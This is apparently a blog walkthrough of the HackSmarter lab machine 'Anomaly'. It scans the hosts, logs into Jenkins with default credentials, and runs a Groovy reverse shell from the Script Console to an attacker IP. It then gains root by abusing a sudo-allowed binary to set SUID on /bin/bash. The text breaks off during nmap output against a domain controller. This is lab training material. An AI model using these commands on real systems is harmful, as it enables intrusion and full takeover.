---
layout: post
title: Anomaly
date: 2026-01-18 13:00:00 +0100
categories: [Walkthroughs]
tags: [HackSmarter, Windows, Linux, Jenkins, sudo, SUID, keytab, Privesc]
---
![alt text](https://images.coursestack.com/336f34fa-2097-4b41-9e05-16698e68dcea/f0890a88-b0d1-49c9-b385-a5087bd232e2)

---

| Description    |  Info |
| --------- | ----------- |
| Platform    | HackSmarter       |
| OS | Linux & Windows        |
| Difficulty | Medium        |
| Release Date | 08/10/2025       |
| Link to machine | [Anomaly](https://www.hacksmarter.org/courses/336f34fa-2097-4b41-9e05-16698e68dcea)        |

# Highlights
HackSmarter, Windows, Linux, Jenkins, sudo, SUID, keytab, Privesc

# Objective and Scope
The core objective is to demonstrate the full impact of a successful network intrusion by achieving ```Domain Administrator``` privileges over the client's Active Directory environment. The test will simulate a motivated external attacker's progression from an initial foothold to complete administrative control.

Scope
The in-scope assets for this engagement include two critical IP addresses:

```A hardened Ubuntu Server``` (Initial Foothold Target).
The primary ```Domain Controller``` (Final Privilege Escalation Target).
It is a critical finding that the Domain Controller is running ```active Antivirus (AV) software```; therefore, this test will specifically involve techniques to bypass or evade the installed AV to successfully compromise the domain and demonstrate the potential for a full domain compromise.

What is the user flag? 



# Rustscan
Another tool that can be used for open ports enumeration is Rustscan. We can target the Ubuntu Server ```10.1.77.251``` for initial foothold.

```bash
┌──(Kyd0s㉿kali)-[~/HackSmarter/Anomaly]
└─$ rustscan -a 10.1.77.251 -r 0-65000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Breaking and entering... into the world of open ports.

[~] The config file is expected to be at "/home/Kyd0s/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.1.77.251:22
Open 10.1.77.251:8080
[~] Starting Script(s)
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-18 18:32 GMT
Initiating Ping Scan at 18:32
Scanning 10.1.77.251 [4 ports]
Completed Ping Scan at 18:32, 0.13s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:32
Completed Parallel DNS resolution of 1 host. at 18:32, 0.03s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 18:32
Scanning 10.1.77.251 [2 ports]
Discovered open port 8080/tcp on 10.1.77.251
Discovered open port 22/tcp on 10.1.77.251
Completed SYN Stealth Scan at 18:32, 1.72s elapsed (2 total ports)
Nmap scan report for 10.1.77.251
Host is up, received echo-reply ttl 62 (0.12s latency).
Scanned at 2025-12-18 18:32:23 GMT for 1s

PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 62
8080/tcp open  http-proxy syn-ack ttl 62

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.05 seconds
           Raw packets sent: 8 (328B) | Rcvd: 315 (12.596KB)

```
Only port ```22``` and ```8080``` open.
Let's launch firefox and visit ```http://10.1.77.251:8080/``` to check what is running on the webserver.
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/Anomaly/Anomaly1.png?raw=true)

Jenkins login page, after a few attemps, we see that we can login to the Jenkins Dashboard using the credentials ```admin:admin```, and the running version is ```Version 2.452.1```


# Foothold on the Ubuntu server
Navigating to the ```http://10.1.77.251:8080/computer/(built-in)/script```, we can use the Script Console to start a reverse shell to our attacker machine.

```bash
┌──(Kyd0s㉿kali)-[~/HackSmarter/Anomaly]
└─$  nc -nlvp 4444

```
Start a listener on the attacker machine

```bash
String host="10.200.24.96";
int port=4444;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Start the Script on the Jenkinds Script Console, once we receive the reverse shell, we can spawn a TTY shell with the following command:

```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
```
Since we have a shell as ```Jenkins```, we need to find a way to escalate privileges to root so we can read the ```/home/Ubuntu``` directory, where the user flag might be.

# Privilege Escalation on the AnomalyUbuntu
Running ```sudo -l``` for standard enumeration

```bash
bash-5.2$ sudo -l
sudo -l
Matching Defaults entries for jenkins on ip-10-1-77-251:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User jenkins may run the following commands on ip-10-1-77-251:
    (ALL) NOPASSWD: /usr/bin/router_config

bash-5.2$ ls -la /usr/bin/router_config
ls -la /usr/bin/router_config
-rwxr-xr-x 1 root root 16128 Sep 21 20:58 /usr/bin/router_config
bash-5.2$ file /usr/bin/router_config
file /usr/bin/router_config
/usr/bin/router_config: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=024376ab7fa387b313b5501f940d1320d04685ca, for GNU/Linux 3.2.0, not stripped

```
We find an interesting binary ```/usr/bin/router_config``` that can be run as sudo without the password, and we have Read and Execute privileges with our current user.
Running the ```strings``` command on the binary, we can try to understand what the binary does so we can exploit it for privilege escalation

```bash
bash-5.2$ strings /usr/bin/router_config
strings /usr/bin/router_config
/lib64/ld-linux-x86-64.so.2
snprintf
puts
__stack_chk_fail
.....
Welcome to Router Configuration Utility v1.2
Usage: %s <config_file>
Applying configuration...
echo Applying config from %s; %s
Configuration applied successfully!
....
```

The binary is ```Router Configuration Utility v1.2``` and can apply a configuration, this should be the perfect privesc vector.
We create a ```.conf``` file in ```/tmp``` that is going to weaponize our binary when run with the sudo command
```bash
bash-5.2$ echo '#!/bin/bash' > /tmp/exploit.conf
```
Then we set the ```SUID/SGID``` bits on ```/bin/bash```
```bash
bash-5.2$ echo 'chmod +s /bin/bash' >> /tmp/exploit.conf
```
Add the execute permissions to the ```.conf``` file
```bash
bash-5.2$ chmod +x /tmp/exploit.conf
```

Then we run our vulnerable binary passing the ```/tmp/exploit.conf``` as the argument
```bash
bash-5.2$ sudo /usr/bin/router_config /tmp/exploit.conf
sudo /usr/bin/router_config /tmp/exploit.conf
Welcome to Router Configuration Utility v1.2
Applying configuration...
Applying config from /tmp/exploit.conf
Configuration applied successfully!
```
Ultimately we spawn a new bash shell with the privileged flag, and we now have root access.
```bash
bash-5.2$ /bin/bash -p
/bin/bash -p
bash-5.2# whoami
whoami
root
```
We can now retrieve the user flag from the ```user.txt``` file in the root directory.

```bash
bash-5.2# pwd
pwd
/root
bash-5.2# ls -la
ls -la
total 44
drwx------  5 root root 4096 Oct  4 22:41 .
drwxr-xr-x 22 root root 4096 Jan 18 18:18 ..
-rw-------  1 root root   55 Oct  4 22:53 .bash_history
-rw-r--r--  1 root root 3106 Apr 22  2024 .bashrc
drwxr-xr-x  3 root root 4096 Sep 21 11:06 .local
-rw-r--r--  1 root root  161 Apr 22  2024 .profile
drwx------  2 root root 4096 Sep 21 12:17 .ssh
-rw-r--r--  1 root root  168 Sep 21 11:46 .wget-hsts
-rw-r--r--  1 root root  543 Sep 21 20:58 router_config.c
drwx------  3 root root 4096 Sep 21 11:05 snap
-rw-r--r--  1 root root   37 Oct  4 22:40 user.txt
bash-5.2# cat user.txt
```
# Rustscan on AnomalyDC
```bash
┌──(Kyd0s㉿kali)-[~/HackSmarter/Anomaly]
└─$ rustscan -a 10.1.121.63 -- -A 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
To scan or not to scan? That is the question.

[~] The config file is expected to be at "/home/Kyd0s/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.1.121.63:53
Open 10.1.121.63:80
Open 10.1.121.63:88
Open 10.1.121.63:135
Open 10.1.121.63:139
Open 10.1.121.63:389
Open 10.1.121.63:445
Open 10.1.121.63:464
Open 10.1.121.63:593
Open 10.1.121.63:636
Open 10.1.121.63:3268
Open 10.1.121.63:3269
Open 10.1.121.63:3389
Open 10.1.121.63:9389
Open 10.1.121.63:49267
Open 10.1.121.63:49664
Open 10.1.121.63:49671
Open 10.1.121.63:49667
Open 10.1.121.63:49684
Open 10.1.121.63:49686
Open 10.1.121.63:49704
Open 10.1.121.63:49717
Open 10.1.121.63:49758

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2025-12-18 19:13:39Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: anomaly.hsm0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=Anomaly-DC.anomaly.hsm
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:Anomaly-DC.anomaly.hsm
| Issuer: commonName=anomaly-ANOMALY-DC-CA-2/domainComponent=anomaly
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-21T22:14:26
| Not valid after:  2026-09-21T22:14:26
| MD5:   2fe3:c33e:4416:0677:f09c:3141:7ebc:dadb
| SHA-1: b3a6:bd0d:65f4:b2df:70eb:efa4:8743:fe35:41ad:9aaf
| -----BEGIN CERTIFICATE-----
| MIIGWjCCBUKgAwIBAgITIQAAAAM9m5XZT2Xc6AAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBQMRMwEQYKCZImiZPyLGQBGRYDaHNtMRcwFQYKCZImiZPyLGQBGRYHYW5vbWFs
| eTEgMB4GA1UEAxMXYW5vbWFseS1BTk9NQUxZLURDLUNBLTIwHhcNMjUwOTIxMjIx
| NDI2WhcNMjYwOTIxMjIxNDI2WjAhMR8wHQYDVQQDExZBbm9tYWx5LURDLmFub21h
| bHkuaHNtMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtCagvgml4j2e
| 5nrfPKR8JZwz5cbfPbSf4QOxbZ6pEnQQVTNTEvwOd9Pc9arSMq5moBShpDALHhyv
| Pdg1nBdz6d9h7RZgqSqVDe9zbxUH067s7ePi+1Lm6VlMsprbdKRMnos2PJImKWTf
| m/SJaMAHS580EwEDH0LywUMVJjBolZulBE2kDcC0bw37AukX1HTc4r1bd5lgjwyu
| oWNcqUVH+mqA8NvNwpDefgJDEsDx9kC0mPx5Q8DokxHYURQuH0FDb5XCetEXTVmo
| qJVaYKbPOrdNuQblIWDEEf+MpEwKhAG8g23hn/jAufy50ahkcUxDjnHvN22PwHs4
| HVlT3n1k0QIDAQABo4IDWjCCA1YwLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkA
| bgBDAG8AbgB0AHIAbwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEF
| BQcDATAOBgNVHQ8BAf8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0D
| AgICAIAwDgYIKoZIhvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0w
| CwYJYIZIAWUDBAECMAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAd
| BgNVHQ4EFgQU9eyvwJgx/LmwWxXiupvm41Ca3I0wHwYDVR0jBBgwFoAUSxx1utyZ
| SUgBUCc9j7sAqbA80EEwgdgGA1UdHwSB0DCBzTCByqCBx6CBxIaBwWxkYXA6Ly8v
| Q049YW5vbWFseS1BTk9NQUxZLURDLUNBLTIsQ049QW5vbWFseS1EQyxDTj1DRFAs
| Q049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmln
| dXJhdGlvbixEQz1hbm9tYWx5LERDPWhzbT9jZXJ0aWZpY2F0ZVJldm9jYXRpb25M
| aXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgckGCCsG
| AQUFBwEBBIG8MIG5MIG2BggrBgEFBQcwAoaBqWxkYXA6Ly8vQ049YW5vbWFseS1B
| Tk9NQUxZLURDLUNBLTIsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9YW5vbWFseSxEQz1oc20/
| Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRo
| b3JpdHkwQgYDVR0RBDswOaAfBgkrBgEEAYI3GQGgEgQQ2h9G/HoggUulVjkhSzV/
| 4oIWQW5vbWFseS1EQy5hbm9tYWx5LmhzbTBPBgkrBgEEAYI3GQIEQjBAoD4GCisG
| AQQBgjcZAgGgMAQuUy0xLTUtMjEtMTQ5Njk2NjM2Mi0zMzIwOTYxMzMzLTQwNDQ5
| MTg5ODAtMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEARRqdwM6Rha2xgQ/N/+JxwJax
| gIceINwSDTIITwNI3QB8k0QX+6oPx3JG9oAoNEVBvEbqMl9ooOTvr5u7bMqAYx44
| Rq5EELmjEJZbQYLKVAZOw60kWPJo8x1gz8nDKYT8l2XTKUjiLabKwZFgtxcDs6Xh
| QZrgx5i8uLHkN1Cpoq7ueDhchHH54oUo+IvpVkBazd5SAzN/7Tk9y5hOAbPDa1w2
| JlhjT7LDe4cONBhTlZlTk8DReJrDpNSmjfV8ooRtm3S8O6d0XTyD5g9J93TRp4yT
| MpdSNV6skrldX8GFNOy6eVbsDWAR/MUUfbTdEzsg4UwV5rk77o6TAElLZZ/0OA==
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: anomaly.hsm0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=Anomaly-DC.anomaly.hsm
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:Anomaly-DC.anomaly.hsm
| Issuer: commonName=anomaly-ANOMALY-DC-CA-2/domainComponent=anomaly
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-21T22:14:26
| Not valid after:  2026-09-21T22:14:26
| MD5:   2fe3:c33e:4416:0677:f09c:3141:7ebc:dadb
| SHA-1: b3a6:bd0d:65f4:b2df:70eb:efa4:8743:fe35:41ad:9aaf
| -----BEGIN CERTIFICATE-----
| MIIGWjCCBUKgAwIBAgITIQAAAAM9m5XZT2Xc6AAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBQMRMwEQYKCZImiZPyLGQBGRYDaHNtMRcwFQYKCZImiZPyLGQBGRYHYW5vbWFs
| eTEgMB4GA1UEAxMXYW5vbWFseS1BTk9NQUxZLURDLUNBLTIwHhcNMjUwOTIxMjIx
| NDI2WhcNMjYwOTIxMjIxNDI2WjAhMR8wHQYDVQQDExZBbm9tYWx5LURDLmFub21h
| bHkuaHNtMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtCagvgml4j2e
| 5nrfPKR8JZwz5cbfPbSf4QOxbZ6pEnQQVTNTEvwOd9Pc9arSMq5moBShpDALHhyv
| Pdg1nBdz6d9h7RZgqSqVDe9zbxUH067s7ePi+1Lm6VlMsprbdKRMnos2PJImKWTf
| m/SJaMAHS580EwEDH0LywUMVJjBolZulBE2kDcC0bw37AukX1HTc4r1bd5lgjwyu
| oWNcqUVH+mqA8NvNwpDefgJDEsDx9kC0mPx5Q8DokxHYURQuH0FDb5XCetEXTVmo
| qJVaYKbPOrdNuQblIWDEEf+MpEwKhAG8g23hn/jAufy50ahkcUxDjnHvN22PwHs4
| HVlT3n1k0QIDAQABo4IDWjCCA1YwLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkA
| bgBDAG8AbgB0AHIAbwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEF
| BQcDATAOBgNVHQ8BAf8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0D
| AgICAIAwDgYIKoZIhvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0w
| CwYJYIZIAWUDBAECMAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAd
| BgNVHQ4EFgQU9eyvwJgx/LmwWxXiupvm41Ca3I0wHwYDVR0jBBgwFoAUSxx1utyZ
| SUgBUCc9j7sAqbA80EEwgdgGA1UdHwSB0DCBzTCByqCBx6CBxIaBwWxkYXA6Ly8v
| Q049YW5vbWFseS1BTk9NQUxZLURDLUNBLTIsQ049QW5vbWFseS1EQyxDTj1DRFAs
| Q049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmln
| dXJhdGlvbixEQz1hbm9tYWx5LERDPWhzbT9jZXJ0aWZpY2F0ZVJldm9jYXRpb25M
| aXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgckGCCsG
| AQUFBwEBBIG8MIG5MIG2BggrBgEFBQcwAoaBqWxkYXA6Ly8vQ049YW5vbWFseS1B
| Tk9NQUxZLURDLUNBLTIsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9YW5vbWFseSxEQz1oc20/
| Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRo
| b3JpdHkwQgYDVR0RBDswOaAfBgkrBgEEAYI3GQGgEgQQ2h9G/HoggUulVjkhSzV/
| 4oIWQW5vbWFseS1EQy5hbm9tYWx5LmhzbTBPBgkrBgEEAYI3GQIEQjBAoD4GCisG
| AQQBgjcZAgGgMAQuUy0xLTUtMjEtMTQ5Njk2NjM2Mi0zMzIwOTYxMzMzLTQwNDQ5
| MTg5ODAtMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEARRqdwM6Rha2xgQ/N/+JxwJax
| gIceINwSDTIITwNI3QB8k0QX+6oPx3JG9oAoNEVBvEbqMl9ooOTvr5u7bMqAYx44
| Rq5EELmjEJZbQYLKVAZOw60kWPJo8x1gz8nDKYT8l2XTKUjiLabKwZFgtxcDs6Xh
| QZrgx5i8uLHkN1Cpoq7ueDhchHH54oUo+IvpVkBazd5SAzN/7Tk9y5hOAbPDa1w2
| JlhjT7LDe4cONBhTlZlTk8DReJrDpNSmjfV8ooRtm3S8O6d0XTyD5g9J93TRp4yT
| MpdSNV6skrldX8GFNOy6eVbsDWAR/MUUfbTdEzsg4UwV5rk77o6TAElLZZ/0OA==
|_-----END CERTIFICATE-----
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: anomaly.hsm0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=Anomaly-DC.anomaly.hsm
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:Anomaly-DC.anomaly.hsm
| Issuer: commonName=anomaly-ANOMALY-DC-CA-2/domainComponent=anomaly
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-21T22:14:26
| Not valid after:  2026-09-21T22:14:26
| MD5:   2fe3:c33e:4416:0677:f09c:3141:7ebc:dadb
| SHA-1: b3a6:bd0d:65f4:b2df:70eb:efa4:8743:fe35:41ad:9aaf
| -----BEGIN CERTIFICATE-----
| MIIGWjCCBUKgAwIBAgITIQAAAAM9m5XZT2Xc6AAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBQMRMwEQYKCZImiZPyLGQBGRYDaHNtMRcwFQYKCZImiZPyLGQBGRYHYW5vbWFs
| eTEgMB4GA1UEAxMXYW5vbWFseS1BTk9NQUxZLURDLUNBLTIwHhcNMjUwOTIxMjIx
| NDI2WhcNMjYwOTIxMjIxNDI2WjAhMR8wHQYDVQQDExZBbm9tYWx5LURDLmFub21h
| bHkuaHNtMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtCagvgml4j2e
| 5nrfPKR8JZwz5cbfPbSf4QOxbZ6pEnQQVTNTEvwOd9Pc9arSMq5moBShpDALHhyv
| Pdg1nBdz6d9h7RZgqSqVDe9zbxUH067s7ePi+1Lm6VlMsprbdKRMnos2PJImKWTf
| m/SJaMAHS580EwEDH0LywUMVJjBolZulBE2kDcC0bw37AukX1HTc4r1bd5lgjwyu
| oWNcqUVH+mqA8NvNwpDefgJDEsDx9kC0mPx5Q8DokxHYURQuH0FDb5XCetEXTVmo
| qJVaYKbPOrdNuQblIWDEEf+MpEwKhAG8g23hn/jAufy50ahkcUxDjnHvN22PwHs4
| HVlT3n1k0QIDAQABo4IDWjCCA1YwLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkA
| bgBDAG8AbgB0AHIAbwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEF
| BQcDATAOBgNVHQ8BAf8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0D
| AgICAIAwDgYIKoZIhvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0w
| CwYJYIZIAWUDBAECMAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAd
| BgNVHQ4EFgQU9eyvwJgx/LmwWxXiupvm41Ca3I0wHwYDVR0jBBgwFoAUSxx1utyZ
| SUgBUCc9j7sAqbA80EEwgdgGA1UdHwSB0DCBzTCByqCBx6CBxIaBwWxkYXA6Ly8v
| Q049YW5vbWFseS1BTk9NQUxZLURDLUNBLTIsQ049QW5vbWFseS1EQyxDTj1DRFAs
| Q049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmln
| dXJhdGlvbixEQz1hbm9tYWx5LERDPWhzbT9jZXJ0aWZpY2F0ZVJldm9jYXRpb25M
| aXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgckGCCsG
| AQUFBwEBBIG8MIG5MIG2BggrBgEFBQcwAoaBqWxkYXA6Ly8vQ049YW5vbWFseS1B
| Tk9NQUxZLURDLUNBLTIsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9YW5vbWFseSxEQz1oc20/
| Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRo
| b3JpdHkwQgYDVR0RBDswOaAfBgkrBgEEAYI3GQGgEgQQ2h9G/HoggUulVjkhSzV/
| 4oIWQW5vbWFseS1EQy5hbm9tYWx5LmhzbTBPBgkrBgEEAYI3GQIEQjBAoD4GCisG
| AQQBgjcZAgGgMAQuUy0xLTUtMjEtMTQ5Njk2NjM2Mi0zMzIwOTYxMzMzLTQwNDQ5
| MTg5ODAtMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEARRqdwM6Rha2xgQ/N/+JxwJax
| gIceINwSDTIITwNI3QB8k0QX+6oPx3JG9oAoNEVBvEbqMl9ooOTvr5u7bMqAYx44
| Rq5EELmjEJZbQYLKVAZOw60kWPJo8x1gz8nDKYT8l2XTKUjiLabKwZFgtxcDs6Xh
| QZrgx5i8uLHkN1Cpoq7ueDhchHH54oUo+IvpVkBazd5SAzN/7Tk9y5hOAbPDa1w2
| JlhjT7LDe4cONBhTlZlTk8DReJrDpNSmjfV8ooRtm3S8O6d0XTyD5g9J93TRp4yT
| MpdSNV6skrldX8GFNOy6eVbsDWAR/MUUfbTdEzsg4UwV5rk77o6TAElLZZ/0OA==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: anomaly.hsm0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=Anomaly-DC.anomaly.hsm
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:Anomaly-DC.anomaly.hsm
| Issuer: commonName=anomaly-ANOMALY-DC-CA-2/domainComponent=anomaly
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-21T22:14:26
| Not valid after:  2026-09-21T22:14:26
| MD5:   2fe3:c33e:4416:0677:f09c:3141:7ebc:dadb
| SHA-1: b3a6:bd0d:65f4:b2df:70eb:efa4:8743:fe35:41ad:9aaf
| -----BEGIN CERTIFICATE-----
| MIIGWjCCBUKgAwIBAgITIQAAAAM9m5XZT2Xc6AAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBQMRMwEQYKCZImiZPyLGQBGRYDaHNtMRcwFQYKCZImiZPyLGQBGRYHYW5vbWFs
| eTEgMB4GA1UEAxMXYW5vbWFseS1BTk9NQUxZLURDLUNBLTIwHhcNMjUwOTIxMjIx
| NDI2WhcNMjYwOTIxMjIxNDI2WjAhMR8wHQYDVQQDExZBbm9tYWx5LURDLmFub21h
| bHkuaHNtMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtCagvgml4j2e
| 5nrfPKR8JZwz5cbfPbSf4QOxbZ6pEnQQVTNTEvwOd9Pc9arSMq5moBShpDALHhyv
| Pdg1nBdz6d9h7RZgqSqVDe9zbxUH067s7ePi+1Lm6VlMsprbdKRMnos2PJImKWTf
| m/SJaMAHS580EwEDH0LywUMVJjBolZulBE2kDcC0bw37AukX1HTc4r1bd5lgjwyu
| oWNcqUVH+mqA8NvNwpDefgJDEsDx9kC0mPx5Q8DokxHYURQuH0FDb5XCetEXTVmo
| qJVaYKbPOrdNuQblIWDEEf+MpEwKhAG8g23hn/jAufy50ahkcUxDjnHvN22PwHs4
| HVlT3n1k0QIDAQABo4IDWjCCA1YwLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkA
| bgBDAG8AbgB0AHIAbwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEF
| BQcDATAOBgNVHQ8BAf8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0D
| AgICAIAwDgYIKoZIhvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0w
| CwYJYIZIAWUDBAECMAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAd
| BgNVHQ4EFgQU9eyvwJgx/LmwWxXiupvm41Ca3I0wHwYDVR0jBBgwFoAUSxx1utyZ
| SUgBUCc9j7sAqbA80EEwgdgGA1UdHwSB0DCBzTCByqCBx6CBxIaBwWxkYXA6Ly8v
| Q049YW5vbWFseS1BTk9NQUxZLURDLUNBLTIsQ049QW5vbWFseS1EQyxDTj1DRFAs
| Q049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmln
| dXJhdGlvbixEQz1hbm9tYWx5LERDPWhzbT9jZXJ0aWZpY2F0ZVJldm9jYXRpb25M
| aXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgckGCCsG
| AQUFBwEBBIG8MIG5MIG2BggrBgEFBQcwAoaBqWxkYXA6Ly8vQ049YW5vbWFseS1B
| Tk9NQUxZLURDLUNBLTIsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9YW5vbWFseSxEQz1oc20/
| Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRo
